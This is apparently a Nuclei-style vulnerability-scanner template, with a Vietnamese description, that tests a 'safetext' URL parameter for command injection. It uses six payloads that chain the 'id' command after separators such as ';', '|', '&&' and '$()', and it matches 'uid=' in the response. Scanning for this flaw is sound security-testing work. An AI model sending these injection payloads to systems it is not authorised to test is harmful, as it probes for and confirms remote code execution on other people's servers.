id: basic-command-injection

info:
  name: Basic Command Injection Test
  severity: critical
  description: "Kiểm tra lỗ hổng command injection cơ bản"

http:
  - method: GET
    path: "{{BaseURL}}?safetext={{payload}}"
    
    payloads:
      payload:
        - ";id"
        - "|id"
        - "&&id"
        - "||id"
        - "$(id)"
        - "`id`"

    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
          - "groups="
        condition: or